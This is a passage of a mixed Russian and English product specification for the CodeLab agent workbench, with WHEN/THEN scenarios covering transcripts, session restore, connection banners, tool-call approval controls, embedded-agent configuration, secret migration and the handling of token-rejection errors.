CodeLab SHALL открывать полноэкранный log viewer (список записей слева, detail-панель выбранной записи справа) поверх притемнённого workbench при вызове через `/logs` или кнопку "Expand" докнутой панели, и SHALL закрывать его без потери состояния workbench под ним.

#### Scenario: Detail-панель показывает correlation-поля выбранной записи
- **WHEN** пользователь выбирает запись в списке полноэкранного log viewer
- **THEN** detail-панель показывает событие целиком, включая доступные correlation-поля (`component`, `category`, `connection_generation`, и где применимо `session_id`/`request_id`/`tool_call_id`) в виде key/value

#### Scenario: Закрытие возвращает к workbench без изменений
- **WHEN** полноэкранный log viewer открыт, и пользователь нажимает кнопку закрытия либо `Esc`
- **THEN** CodeLab скрывает log viewer и возвращает workbench к состоянию, в котором он был до открытия (активная сессия, transcript, docked-панели не меняются)

#### Scenario: Секреты замаскированы и в списке, и в detail-панели
- **WHEN** запись, отображаемая в полноэкранном log viewer (в списке или в detail-панели), содержит значение, подпадающее под существующее правило редактирования секретов
- **THEN** это значение показано замаскированным — то же самое правило, что уже действует для docked debug-лога (см. `approval-safety`, требование "Редактирование секретов"), не дублируется отдельным набором правил

### Requirement: Отменяемый ход в workbench
CodeLab SHALL показывать вызов инструмента, отменённый клиентом при отправке `session/cancel`, со статусом «Cancelled», а не «Failed» или «Running». Пока ход «отменяется», сессия SHALL считаться занятой: кнопка отмены недоступна, очередь промптов не отправляет следующее сообщение до ответа агента на `session/prompt`.

#### Scenario: Отменённый вызов показан как Cancelled
- **WHEN** пользователь отменяет ход, пока вызов инструмента выполняется
- **THEN** запись вызова в transcript показывает статус «Cancelled»

#### Scenario: Очередь ждёт ответа агента на отмену
- **WHEN** пользователь отменяет ход, в очереди сессии есть сообщение, а агент ещё не ответил на `session/prompt`
- **THEN** CodeLab не отправляет сообщение из очереди и не показывает кнопку отмены; после ответа агента сообщение отправляется автоматически

### Requirement: Лента transcript следует за хвостом
CodeLab SHALL держать в виду конец ленты transcript, пока пользователь находится у её низа: когда в ленту дописываются или меняются записи, лента SHALL прокручиваться к новому низу. Если пользователь прокрутил ленту вверх, чтобы читать историю, CodeLab SHALL NOT менять позицию прокрутки.

#### Scenario: Новые записи у низа ленты остаются видимыми
- **WHEN** пользователь находится у низа ленты (не дальше 80 px) и в ленту приходят новые записи — ответ агента, карточки tool call, результаты
- **THEN** после перерисовки лента прокручена к новому низу без анимации, и последняя запись видна

#### Scenario: Чтение истории не прерывается
- **WHEN** пользователь прокрутил ленту вверх дальше 80 px от низа, и в ленту приходят новые записи
- **THEN** позиция прокрутки не меняется

#### Scenario: Возврат к низу возобновляет следование
- **WHEN** пользователь, читавший историю, прокрутил ленту обратно к низу (не дальше 80 px), и в ленту приходят новые записи
- **THEN** лента снова прокручивается к новому низу

#### Scenario: Автопрокрутка к approval сохраняется
- **WHEN** вместе с новыми записями появляется новый pending approval
- **THEN** CodeLab прокручивает ленту к approval так же, как требует сценарий «Лента автоскроллится к новому approval»

### Requirement: Sessions sidebar lists the project's sessions from the agent
When the agent declares `sessionCapabilities.list`, the sessions sidebar SHALL show the project's sessions from `session/list` after each successful connect or reconnect, after the sessions opened in this run and without duplicates. A session that is not open yet SHALL be shown with its title from the agent and a "not loaded" status. When the agent reports more sessions, the sidebar SHALL offer a "Load more sessions" control that fetches the next page.

#### Scenario: Sessions from the agent's journal
- **WHEN** the user connects to an agent whose journal holds two sessions for the selected project
- **THEN** the sidebar lists both sessions with their titles and a "not loaded" status

#### Scenario: More sessions than one page
- **WHEN** the agent's first `session/list` page has a `nextCursor`
- **THEN** the sidebar shows "Load more sessions", and selecting it appends the next page

### Requirement: Selecting a not-loaded session restores its transcript
Selecting a "not loaded" session in the sidebar SHALL load it via `session/load` and make it the active session with the transcript replayed by the agent. If loading fails, the previously active session SHALL stay active and the failure SHALL be recorded as a diagnostic.

#### Scenario: Loading a session from the sidebar
- **WHEN** the user selects a "not loaded" session
- **THEN** the session becomes active and its transcript shows the user prompts and agent replies the agent replayed

#### Scenario: Loading fails
- **WHEN** the agent answers `session/load` with an error
- **THEN** the active session does not change, the sidebar row stays "not loaded", and a diagnostic records the failure

### Requirement: Workbench restores sessions after reconnect and restart
After `Reconnect`, the workbench SHALL reload the open sessions so the active session's transcript matches the agent's replay; a session the agent cannot restore SHALL be shown as "detached" with a notice in its transcript, and prompts to it SHALL fail without reaching the agent. After an app restart, the workbench SHALL select the project from the previous run and, on the first successful connect, SHALL list the project's sessions and load the previously active session; when the agent cannot restore it, the workbench SHALL start a new session with a notice explaining why.

#### Scenario: Reconnect reloads the active session
- **WHEN** a session with a finished turn is active and the user presses Reconnect to an agent that supports `session/load`
- **THEN** after reconnecting the active session shows the same transcript, rebuilt from the agent's replay

#### Scenario: Restart restores the previous session
- **WHEN** the user restarts the app after working in a session and connects again with the same connection settings
- **THEN** the previous project is selected, the sidebar lists the project's sessions, and the previously active session is loaded with its transcript

#### Scenario: The agent cannot restore sessions
- **WHEN** after a restart the user connects to an agent without `loadSession`
- **THEN** the workbench starts a new session in the previous project and its transcript shows "The agent cannot restore sessions; a new session was started."

### Requirement: Connection banner above a non-empty transcript
When the transcript of the active session is not empty and the connection is `lost`, `failed` or `reconnecting`, the workbench SHALL show a banner above the transcript that states the connection status and its reason. The banner SHALL offer Reconnect and Connection settings while the connection is `lost` or `failed`, and SHALL show progress without a Reconnect action while it is `reconnecting`. The banner SHALL NOT be dismissible and SHALL disappear when the connection becomes `connected`. When the transcript is empty, the workbench SHALL keep showing the connection screen instead of the banner.

#### Scenario: The agent process exits during a session
- **WHEN** the active session's transcript has entries and the agent process exits unexpectedly
- **THEN** a "Connection to the agent lost" banner with the reason, a Reconnect action and a Connection settings action appears above the transcript, and the transcript entries stay visible

#### Scenario: Reconnect from the banner
- **WHEN** the user selects Reconnect in the banner and the reconnect succeeds
- **THEN** the banner shows "Reconnecting…" without the Reconnect action while reconnecting, and disappears once the connection is `connected`

#### Scenario: Reconnect from the banner fails
- **WHEN** the user selects Reconnect in the banner and the attempt fails
- **THEN** the banner shows "Could not connect to the agent" with the failure reason and offers Reconnect again

#### Scenario: Empty transcript keeps the connection screen
- **WHEN** the connection is lost while the active session's transcript is empty
- **THEN** the workbench shows the connection screen with Reconnect and no banner

### Requirement: Failed turn notice with Retry
A failed prompt turn SHALL be shown in the transcript as a notice whose title describes the failure class and whose body is the agent's message, with the raw error text available only in collapsed details. The title SHALL follow the agent's `errorClass`:

| `errorClass` | Title |
|---|---|
| `auth` | The agent could not sign in to the model provider |
| `network`, `timeout`, `server` | The model provider is unavailable |
| `rateLimited` | The model provider's rate limit was reached |
| `overflow` | The conversation is too long for the model |
| a turn interrupted by a lost connection | The connection to the agent was lost |
| any other or no class | The agent could not complete the turn |

The notice of the session's last turn SHALL offer a Retry action exactly when the session can retry it (`SessionView.canRetry`, requirement "Повтор сорвавшегося хода" of `acp-client-kit`) and the connection is `connected`. Selecting Retry SHALL send the same prompt as a new turn.

#### Scenario: Provider authentication failure
- **WHEN** the agent answers the prompt as in fixture `acp/prompt-failed-provider-auth`
- **THEN** the transcript shows "The agent could not sign in to the model provider" with the body "401 Unauthorized from openai: check api_key_env", no Retry action, and the raw error text only inside collapsed details

#### Scenario: Retry after a provider outage
- **WHEN** the last turn failed with `errorClass: "server"` and `retryable: true`, and the user selects Retry
- **THEN** the same prompt is sent as a new turn, and the failed turn with its notice stays in the transcript above it

#### Scenario: Turn interrupted by a lost connection
- **WHEN** the agent process exits while a turn is running
- **THEN** the turn's notice reads "The connection to the agent was lost" without a Retry action, and the connection banner offers Reconnect

#### Scenario: Error from a third-party agent
- **WHEN** an agent without the CodeLab extension answers the prompt with a JSON-RPC error without `data`
- **THEN** the notice reads "The agent could not complete the turn" with the JSON-RPC error message as its body, and offers Retry

### Requirement: Layout class follows the window width
CodeLab SHALL choose the workbench layout class only from the window width in logical pixels (`dart-agent-and-clients` §12.8.3):

| Class | Window width |
|---|---|
| phone | < 641 |
| narrow | 641–899 |
| medium | 900–1279 |
| wide | ≥ 1280 |

In `wide` the sidebar and the tool dock SHALL be columns. In `medium` the sidebar SHALL be a column that Cmd/Ctrl+B collapses to icons, and the dock SHALL slide over the transcript. In `narrow` and `phone` both SHALL slide over the content. Changing the class SHALL NOT lose the composer text or the transcript scroll position.

#### Scenario: Thresholds
- **WHEN** the window is 640, 641, 899, 900, 1279 and 1280 px wide
- **THEN** the layout class is phone, narrow, narrow, medium, medium and wide respectively

#### Scenario: Dock as a column only when wide
- **WHEN** the Plan pane is open and the window is resized from 1280 px to 1279 px
- **THEN** the dock changes from a column beside the session pane to a panel that slides over the transcript

#### Scenario: Resizing keeps the draft and the scroll position
- **WHEN** the composer holds unsent text, the transcript is scrolled up, and the window is resized from 1440 px to 820 px and back
- **THEN** the composer holds the same text and the transcript keeps its scroll position

### Requirement: App bar with palette search and connection badge
CodeLab SHALL show an app bar with the app name, a search field labelled "Search or run a command" with the palette shortcut, toggles for the available tool panes, and a connection badge. Activating the search field SHALL open the command palette. The badge SHALL show the connection status; while the connection is lost or failed it SHALL offer Retry, which reconnects, and while disconnected it SHALL offer Connect. The app bar SHALL NOT show the agent binary path.

#### Scenario: Search field opens the palette
- **WHEN** the user clicks the "Search or run a command" field
- **THEN** the command palette opens with focus in its search box

#### Scenario: Badge offers Retry after a lost connection
- **WHEN** the agent process exits while connected
- **THEN** the badge reads "Connection lost" and offers Retry, and choosing Retry starts a reconnect

#### Scenario: Badge while connected
- **WHEN** the connection is established
- **THEN** the badge reads "Connected", no Connect button is shown, and the profile and transport are available in the badge tooltip

### Requirement: Sessions sidebar grouped by project
The sessions sidebar SHALL show, from top to bottom, "New session" with its shortcut, a filter field, a "Projects" section with one group per project, "Open folder…", and "Settings" at the bottom. The selected project's group SHALL be expanded and list its sessions with their status and "Load more sessions"; recent projects SHALL be collapsed groups named after the folder. The filter SHALL narrow the listed sessions by title.

#### Scenario: Groups by project
- **WHEN** the selected project has three sessions and two other projects are in the recent list
- **THEN** the sidebar shows the selected project's group expanded with three sessions and two collapsed groups for the other projects

#### Scenario: Filtering sessions
- **WHEN** the user types "reconnect" into the filter field
- **THEN** only sessions whose title contains "reconnect" (case-insensitive) stay listed

#### Scenario: Session status in the sidebar
- **WHEN** a listed session is running a turn, waiting for approval, failed or not loaded
- **THEN** its row shows the matching status, as in "Sessions sidebar shows live status for background sessions"

### Requirement: Tool dock with closable pane tabs
CodeLab SHALL host tool panes in a dock on the right, with one closable tab per open pane. Each available pane SHALL have a toggle in the app bar that opens it, makes it active, or closes it when it is already active. With no open panes the dock SHALL NOT be shown. The open panes, the active pane and the dock width SHALL persist across restarts. This change SHALL provide the Plan pane (the full plan checklist) and the Protocol pane; a pane without data SHALL NOT be offered.

#### Scenario: Opening and closing a pane
- **WHEN** the user clicks the Plan toggle, then closes the Plan tab
- **THEN** the dock appears with the Plan tab active, and after closing it the dock disappears and the transcript takes the width

#### Scenario: Two panes as tabs
- **WHEN** Plan and Protocol are both open
- **THEN** the dock shows two tabs, and clicking a tab makes that pane active

#### Scenario: Open panes survive a restart
- **WHEN** Plan and Protocol are open with Protocol active, and CodeLab is restarted
- **THEN** the dock opens with both tabs and Protocol active

### Requirement: Session pane header
The session pane SHALL have a header with the session title, a project chip named after the folder of the session's `cwd` with the full path as a tooltip, and a mode chip when the agent publishes a mode config option. While the session is busy, the header SHALL show a turn state chip: "Turn running" with a progress indicator while a turn runs, "Waiting for approval" while the turn waits for a pending approval, and "Cancelling…" while a cancellation awaits the agent's answer. An idle, failed or detached session SHALL show no turn state chip.

#### Scenario: Header of an active session
- **WHEN** a session titled "Fix reconnect race" in `/work/codelab-app` is active and the agent publishes the mode "standard"
- **THEN** the header shows "Fix reconnect race", a "codelab-app" chip with the tooltip `/work/codelab-app`, and a "standard" chip

#### Scenario: Turn state in the header
- **WHEN** the active session runs a turn, then the turn waits for an approval, then the user approves and the turn ends
- **THEN** the header shows "Turn running", then "Waiting for approval", then "Turn running", and no turn state chip after the turn ends

### Requirement: Transcript reads as a conversation
The transcript SHALL be laid out as a conversation in a column centred in the session pane, at most 760 px wide, without a frame around the transcript. A user message SHALL be a bubble aligned to the right, at most 78% of the column width, without a "You" label. An agent reply SHALL be rendered markdown in the column (requirement "Markdown в ответе агента") without a card and without an "Agent" label. Consecutive rows SHALL be separated by spacing, not by per-row cards.

#### Scenario: A prompt and its reply
- **WHEN** the user sends "Render replies as markdown" and the agent answers "I'll split the transcript into typed rows."
- **THEN** the transcript shows the prompt in a right-aligned bubble and the answer as a paragraph below it, and neither row shows a "You" or "Agent" label

#### Scenario: Wide window keeps a readable column
- **WHEN** the session pane is 1200 px wide
- **THEN** the transcript column is 760 px wide and centred in the pane

### Requirement: Model thoughts in a collapsible block
Each `agent_thought_chunk` segment SHALL be shown as a thought block distinct from the agent reply: muted text, a thought icon and a header. While the thought is streaming (it is the last transcript item of a running turn), the header SHALL read "Thinking…" with a progress indicator and the block SHALL be expanded. After the thought ends, the header SHALL read "Thoughts" and the block SHALL collapse to its header without animation. The user's manual choice to expand or collapse a block SHALL win over these defaults and SHALL survive the row scrolling out of view. In `verbose` the block SHALL be expanded by default; in `summary` it SHALL stay a one-line header. Thought text SHALL be shown as is, without markdown, and SHALL NOT be part of the agent reply.

#### Scenario: Thought while streaming
- **WHEN** the agent streams `agent_thought_chunk` updates and nothing else yet
- **THEN** the transcript shows an expanded block headed "Thinking…" with a progress indicator and the thought text

#### Scenario: Thought collapses when the reply starts
- **WHEN** after the thought the agent streams `agent_message_chunk` updates
- **THEN** the thought block collapses to its header "Thoughts", and the reply is shown below it as rendered markdown

#### Scenario: The user's choice wins
- **WHEN** the user expands a finished thought block, scrolls it out of view and back
- **THEN** the block is still expanded

### Requirement: Tool call as a one-line row
Each tool call SHALL be shown as one row with a status glyph, a label by the tool call's kind, a detail and a status tag, following `ToolRowView` from the client kit (requirement "Строка инструмента без сырого JSON" of `acp-client-kit`). The row SHALL NOT show the protocol kind name or raw JSON. The status tag SHALL read "Queued", "Running", "Done", "Failed" or "Cancelled" by the tool call status. A row with a secondary line or text output SHALL be expandable: expanded, it SHALL show the secondary line and the text output. In `summary` and `normal` rows SHALL be collapsed by default and in `verbose` expanded; a row with a pending approval SHALL always be expanded.

While the tool call has a pending approval, its row SHALL show instead of the status tag the approval risk as a tag ("Read-only", "Local write", "Network", "Shell", "Destructive"), and its detail SHALL be the full subject of the request — the command for a tool call of kind `execute` — without truncation: the detail SHALL wrap up to three lines, and a longer detail SHALL offer "Show full command" that shows the rest in place.

#### Scenario: Completed read
- **WHEN** the agent reads `lib/main.dart` with a tool call of kind `read` that completes
- **THEN** the transcript shows one row "Read lib/main.dart" with the tag "Done", without the words `read` or `completed` and without its `rawInput`

#### Scenario: Command awaiting approval
- **WHEN** a tool call of kind `execute` with `rawInput.command` "echo running tests" waits for an approval with the risk `shell`
- **THEN** its row reads "Run echo running tests" with the tag "Shell" and is expanded with the decision bar

#### Scenario: Long command is never cut before the decision
- **WHEN** a tool call of kind `execute` waits for an approval with a command longer than three lines of the row
- **THEN** the row shows the first three lines of the command and "Show full command", and choosing "Show full command" shows the whole command without an ellipsis

#### Scenario: Failed call shows its reason when expanded
- **WHEN** a tool call fails with the text content "File not found: lib/main.dart" and the user expands its row
- **THEN** the row shows "File not found: lib/main.dart" below its header

### Requirement: Approval card inside the tool call row
A pending approval SHALL be shown inside its tool call row as one decision bar at the bottom of the row, not as a separate card. The decision bar SHALL separate the decision from its scope: it SHALL show an "Allow" button and a "Reject" button and a scope selector with "Only this time" and "Always". A button SHALL answer with the agent's option of its decision and the selected scope:

| Button | Only this time | Always |
|---|---|---|
| Allow | `allow_once` | `allow_always` |
| Reject | `reject_once` | `reject_always` |

The scope SHALL default to "Only this time" when the request has an `allow_once` or `reject_once` option, and to "Always" otherwise. A scope SHALL be offered only when the request has an option of that scope. A button whose decision has no option in the selected scope SHALL be disabled and SHALL say that the agent offers no such option. The "Always" scope SHALL show the names of the agent's `allow_always` and `reject_always` options. The scope SHALL apply to this approval only. Each button SHALL show the shortcut of the option it answers with; option shortcuts SHALL stay as in requirement "Approval options are rendered and bound to shortcuts by kind" and SHALL work whatever scope is selected. The decision bar SHALL NOT repeat the command shown in the row header and SHALL NOT carry a title. The reason, when present, SHALL be shown as a muted line above the decision bar. The raw input SHALL stay collapsed until the user chooses "View raw input" in the decision bar, as in requirement "Approval panel offers a collapsed raw input view". After the decision the decision bar SHALL be replaced by a tag in the tool call row naming the outcome, as in requirement "Паттерны взаимодействия agent workbench".

#### Scenario: Command decision bar
- **WHEN** a tool call of kind `execute` with command "echo running tests" asks for permission with the four standard option kinds
- **THEN** the bottom of its row shows "Allow", "Reject" and the scope "Only this time", and the command is not shown a second time

#### Scenario: Allow once by default
- **WHEN** the user chooses "Allow" without changing the scope
- **THEN** CodeLab selects the `allow_once` option for that approval

#### Scenario: Always is an explicit scope
- **WHEN** the user selects the scope "Always" and chooses "Reject"
- **THEN** CodeLab selects the `reject_always` option for that approval

#### Scenario: A scope without an option for a decision
- **WHEN** a request offers only `allow_always` and `reject_once` and the scope is "Only this time"
- **THEN** "Reject" is enabled, "Allow" is disabled and says the agent offers no such option, and selecting "Always" enables "Allow" and disables "Reject"

#### Scenario: Shortcut of an always option
- **WHEN** the approval is focused, the scope is "Only this time" and the user presses the shortcut of `allow_always`
- **THEN** CodeLab selects the `allow_always` option for that approval

#### Scenario: Decision leaves a tag
- **WHEN** the user chooses "Allow" with the scope "Only this time" and the agent's `allow_once` option is named "Allow once"
- **THEN** the decision bar disappears and the tool call row shows a tag "Allow once" with a success tone

### Requirement: Transcript notices by severity
Transcript notices SHALL be styled by their kind. A failed turn notice SHALL be an error InfoBar, as in requirement "Failed turn notice with Retry". A detached session notice SHALL be a warning InfoBar. A notice that a new session was started instead of a restored one, a session reconnection notice, and an empty turn notice SHALL be a neutral one-line note with an info icon. Only the failed turn notice SHALL use the error tone.

#### Scenario: New session after a failed restore
- **WHEN** the agent cannot restore sessions and the workspace starts a new session with a notice
- **THEN** the transcript shows "The agent cannot restore sessions; a new session was started." as a neutral note, not as an error

### Requirement: Empty session after connecting
When the connection is established and the active session has no transcript items, the session pane SHALL show an empty state inviting the user to send the first message instead of the connection screen. The connection screen SHALL be shown only while the connection is not established.

#### Scenario: New session while connected
- **WHEN** the connection is established and the user creates a new session
- **THEN** the session pane shows the empty state with the composer focused, and no Connect button

### Requirement: Тип подключения «Встроенный агент»
Встроенный агент SHALL быть первой строкой списка профилей страницы настроек «Connection» (spec app-settings «Список профилей на странице «Connection»»), а не типом в форме подключения (design.md change `add-app-settings-shell`, D6). У строки нет полей. Рабочая папка выбирается «Open Project», как у других профилей. Конфигурация агента берётся из `$CODELAB_HOME/config.yaml` и проектного `.codelab/config.yaml`, ключи — из хранилища секретов агента.

Подключение SHALL строить профиль `ConnectionProfile.embedded(id: 'embedded', hostProfile: 'embedded-app-desktop')`, а транспорт ему даёт `EmbeddedTransportResolver`, зарегистрированный в composition root (`apps/codelab_desktop/lib/app/`). Виджеты и Cubit-ы НЕ SHALL импортировать `package:codelab_embedded/io.dart`.

Без сохранённого выбора профиля по умолчанию профилем по умолчанию SHALL быть встроенный агент; профиль `default` из `profiles.json` app не учитывает (design.md change `add-app-settings-shell`, D5).

Требования к поведению:
- **Невалидная или отсутствующая конфигурация** встроенного агента SHALL переводить подключение в `ConnectionFailed` (design.md change `add-embedded-agent-mode`, D13, п. 2). Баннер соединения SHALL показывать текст `EmbeddedAgentConfigException`: проблемы загрузчика в форме `config check` и подсказку `Configure the embedded agent in <home>/config.yaml; check it with: codelab config check`. Значений секретов в нём нет.
- **Нет ключа провайдера.** Подключение SHALL открываться. Первый ход с этим провайдером SHALL завершаться ошибкой провайдера с именем секрета без значения и показываться заметкой «Failed turn» (требование «Failed turn notice with Retry»), как у внешнего агента. Отдельной проверки готовности провайдера при подключении нет.
- **Одобрения, очередь промптов, список сессий, отмена хода и транскрипт** встроенного агента SHALL работать теми же компонентами, что для внешнего агента.
- **Обрыв соединения** (отказ встроенного агента, `ConnectionLost`) SHALL отображаться так же, как обрыв внешнего агента.
- **Повторный Connect во время подключения** встроенного агента SHALL прерывать прежнюю попытку без промежуточного `ConnectionFailed`: баннер соединения показывает подключение новой попытки, агент прерванной попытки освобождается резолвером (требование acp-client-kit «Явный автомат соединения»; design.md change `add-embedded-agent-mode`, D6).
- **Закрытие root scope** SHALL ждать остановки встроенного агента не дольше 10 s. По истечении приложение SHALL писать событие `embedded.close_timeout` уровня `warning` без текста ошибки и продолжать освобождение транспорта и `AcpClientApplication` (D9).

#### Scenario: Выбор встроенного агента
- **WHEN** пользователь открывает страницу настроек «Connection» и нажимает «Connect» в строке «Embedded agent» при выбранном проекте
- **THEN** CodeLab подключается к встроенному агенту без запуска дочернего процесса, а метка подключения — `Embedded agent`

#### Scenario: Встроенный агент по умолчанию
- **WHEN** CodeLab запускается впервые с пустым `CODELAB_HOME`, и пользователь нажимает «Connect» на экране подключения
- **THEN** CodeLab подключается к встроенному агенту

#### Scenario: Нет конфигурации встроенного агента
- **WHEN** `$CODELAB_HOME` не содержит `config.yaml`, и пользователь подключается к встроенному агенту
- **THEN** подключение в состоянии `ConnectionFailed`, баннер показывает проблему конфигурации и подсказку `Configure the embedded agent in <home>/config.yaml; check it with: codelab config check`, где `<home>` — путь `CODELAB_HOME`

#### Scenario: Невалидный проектный конфиг встроенного агента
- **WHEN** выбранный проект содержит `.codelab/config.yaml` с `budget.max_steps: 0`, и пользователь подключается к встроенному агенту
- **THEN** подключение в состоянии `ConnectionFailed`, баннер называет файл, строку и ключ `budget.max_steps` и содержит ту же подсказку

#### Scenario: Нет ключа провайдера
- **WHEN** `config.yaml` валиден и задаёт провайдера с `api_key_secret: codelab/p`, секрет `codelab/p` не задан, и пользователь подключается к встроенному агенту и отправляет промпт
- **THEN** подключение установлено, ход завершается заметкой «Failed turn» с ошибкой провайдера, называющей `codelab/p`, без значения секрета

#### Scenario: Одобрение во встроенном режиме
- **WHEN** встроенный агент спрашивает одобрение `write` в режиме `standard`, и пользователь выбирает вариант отказа в карточке одобрения
- **THEN** файл не изменён, а строка вызова в транскрипте показывает отказ

#### Scenario: Повторный Connect во время подключения встроенного агента
- **WHEN** пользователь подключается к встроенному агенту, и, пока агент ещё открывается, снова нажимает `Connect`
- **THEN** баннер соединения не показывает `ConnectionFailed` прерванной попытки, подключение завершается исходом второй попытки, а агент первой попытки остановлен

#### Scenario: Зависшая остановка встроенного агента
- **WHEN** root scope закрывается, а остановка встроенного агента не завершается за 10 s
- **THEN** в логе приложения есть `embedded.close_timeout` уровня `warning`, а транспорт и `AcpClientApplication` освобождены

### Requirement: Перенос секретов встроенного агента
Если встроенный агент открыт с `EmbeddedAgent.secretsInConfig == true`, рабочее место CodeLab SHALL показывать над транскриптом предупреждение уровня `warning` (Fluent `InfoBar`, как баннер соединения) с текстом `Secrets are stored in the agent config file.` и кнопкой `Migrate secrets` (решение пользователя 2026-11-04 R8-3; design.md change `add-config-literal-secrets-and-migrate`, D8). Подключение и работа агента при этом НЕ SHALL блокироваться. Закрытие предупреждения крестиком скрывает его до следующего подключения; `Close` после успешного переноса (`applied`) — тоже.

`Migrate secrets` SHALL открывать диалог с планом переноса — строками отчёта `SecretMigrator` для папки, с которой открыт встроенный агент (`cwd` агента, а не текущая папка настроек; `--all`, `--dry-run`), без значений секретов:
- бэкенд только для чтения → текст `Secrets cannot be stored: the env backend is read-only. Add secrets.backend: file to <home>/config.yaml, or set CODELAB_SECRET_* variables.` и только кнопка `Close`;
- конфликт имени с хранилищем → текст конфликта и `Close`; замена существующего секрета в app НЕ SHALL предлагаться;
- все находки только в файле `CODELAB_CONFIG` → строки плана и только `Close`;
- пустой план → `Nothing to migrate.` и только `Close`;
- иначе → `Migrate` и `Cancel`.

Во время переноса диалог НЕ SHALL закрываться (`Esc` и щелчок вне диалога игнорируются); одновременно SHALL выполняться не больше одной операции плана или переноса.

`Migrate` SHALL выполнять перенос тем же движком через порт приложения. Реализация — в composition root через `package:codelab_embedded/io.dart` с тем же `CODELAB_HOME`, `CODELAB_CONFIG` и окружением, что у открывателя встроенного агента; виджеты НЕ SHALL обращаться к файлам и хранилищу. Тексты `planFailed`/`applyFailed` и записи лога app SHALL строиться только из типизированного отчёта или имени типа исключения, НЕ из `error.toString()`. Подсказка для бэкенда `env` на Windows SHALL совпадать с веткой `secret set` (только переменные `CODELAB_SECRET_*`). После успеха диалог SHALL показывать `Secrets moved. Restart the embedded agent to use them.` и кнопку `Restart agent`, которая повторяет подключение тем же профилем; она SHALL быть недоступна, пока идёт ход в любой сессии встроенного агента (подсказка `Wait for the current turn to finish.`), и если за время переноса встроенный агент закрылся или сменился (подсказка `The embedded agent is no longer connected.`); `Close` тогда SHALL переходить по текущему состоянию предложения: нет агента со секретами — предупреждение скрыто, новый агент со секретами — предупреждение показано. Если перенос сорвался после того, как часть файлов уже перенесена (`movedAny`), диалог SHALL показывать перенесённое и предлагать `Restart agent`. Поздний результат плана или переноса после закрытия диалога или новой попытки SHALL отбрасываться. Лог app SHALL писать события `secret_migration.planned`, `secret_migration.applied`, `secret_migration.result_discarded`, `secret_migration.plan_failed`, `secret_migration.apply_failed` только с числами, id бэкенда и именами типов — без путей ключей, имён секретов и текстов.

#### Scenario: Предупреждение и перенос
- **WHEN** встроенный агент открыт с литеральным `api_key` в `<home>/config.yaml` и `secrets.backend: file`, пользователь нажимает `Migrate secrets`, затем `Migrate`
- **THEN** диалог показал строку плана для `providers.<id>.api_key` без значения; после переноса файл содержит `api_key_secret`, а `Restart agent` переподключает встроенного агента, после чего предупреждения нет

#### Scenario: Бэкенд env
- **WHEN** то же, но `secrets.backend` не задан
- **THEN** диалог показывает текст о бэкенде `env` и только `Close`; файл не изменён

#### Scenario: Поздний результат
- **WHEN** пользователь закрывает диалог, пока план ещё строится
- **THEN** результат плана не меняет состояние Cubit и не открывает диалог снова

#### Scenario: Окружение движка совпадает с агентом
- **WHEN** приложение запущено с временными `CODELAB_HOME` и `CODELAB_CONFIG`, и пользователь открывает план
- **THEN** план построен по тем же файлам, что открыватель встроенного агента (`app_scope.dart`), а не по `~/.codelab`

#### Scenario: Папка агента, а не текущая папка
- **WHEN** встроенный агент открыт для проекта `A`, пользователь переключает папку настроек на проект `B` без переподключения и нажимает `Migrate secrets`
- **THEN** план построен по слоям проекта `A`; файлы проекта `B` не читались и не изменены

#### Scenario: Диалог не закрывается во время переноса
- **WHEN** порт `apply` ещё не завершён, а пользователь нажимает `Esc` и повторно `Migrate`
- **THEN** диалог остаётся открытым в состоянии переноса, порт `apply` вызван один раз

#### Scenario: Ход в другой сессии
- **WHEN** перенос завершён (`applied`), а в неактивной сессии встроенного агента идёт ход
- **THEN** `Restart agent` недоступна до конца хода

#### Scenario: Агент сменился во время переноса
- **WHEN** во время `applying` встроенный агент закрывается, а перенос затем завершается
- **THEN** диалог показывает итог переноса, `Restart agent` недоступна с подсказкой `The embedded agent is no longer connected.`, а после `Close` предупреждение скрыто

#### Scenario: Close после переноса
- **WHEN** перенос завершён, и пользователь нажимает `Close`
- **THEN** предупреждение `Secrets are stored in the agent config file.` не показывается до следующего подключения

#### Scenario: Частичный перенос
- **WHEN** перенос записал пользовательский файл и сорвался на проектном (`movedAny`)
- **THEN** диалог показывает строки перенесённого и кнопку `Restart agent`

#### Scenario: Пустой план
- **WHEN** план не содержит ни одного пункта
- **THEN** диалог показывает `Nothing to migrate.` и только `Close`

#### Scenario: Лог без данных конфига
- **WHEN** план и перенос выполнены для `providers.lm.api_key` с секретом `codelab/lm`
- **THEN** лог app содержит `secret_migration.planned` и `secret_migration.applied` с числами и id бэкенда и не содержит `providers.lm`, `codelab/lm` и значения

#### Scenario: Ошибка без текста исключения
- **WHEN** порт бросает исключение, чей `toString()` содержит `sk-test-leak-0123456789`
- **THEN** диалог и лог app показывают имя типа исключения и не содержат `sk-test-leak-0123456789`

### Requirement: Отказ подключения из-за токена в workbench
Если WebSocket-агент отклоняет рукопожатие со статусом 401 или 403 (`tokenRejectionStatus` kit, spec acp-client-kit «Отказ рукопожатия из-за токена»), баннер сбоя подключения в main pane и диагностика `ConnectionCubit` SHALL показывать причину `The agent rejected the token (HTTP <код>).`, если токен был отправлен, и `The agent requires a token (HTTP <код>).`, если нет (`describeConnectFailureByToken` kit отдаёт строчный текст без точки, app делает первую букву заглавной и ставит точку, как в D3; design.md change `add-provider-setup-ui`, D25), вместо общего `Failed to connect ACP transport.`. Остальные ошибки подключения SHALL показываться как раньше. Значение токена, его ссылка и имя переменной НЕ SHALL попадать в баннер, диагностику и журнал.

#### Scenario: Отправленный токен отклонён
- **WHEN** окно подключается к WebSocket-профилю с `tokenRef: env:DEVBOX_TOKEN` (переменная задана значением `sk-test-leak-0123456789`), а сервер отвечает на рукопожатие `401`
- **THEN** баннер и диагностика содержат `The agent rejected the token (HTTP 401).` и не содержат маркера

#### Scenario: Токена нет
- **WHEN** окно подключается к WebSocket-профилю без токена (или с `secret:`, у которого нет значения), а сервер отвечает `403`
- **THEN** баннер и диагностика содержат `The agent requires a token (HTTP 403).`

#### Scenario: Прочие ошибки без изменений
- **WHEN** сервер отвечает на рукопожатие `500` или порт закрыт
- **THEN** баннер показывает прежний текст сбоя подключения, без слов о токене

### Requirement: Встроенный агент без провайдера
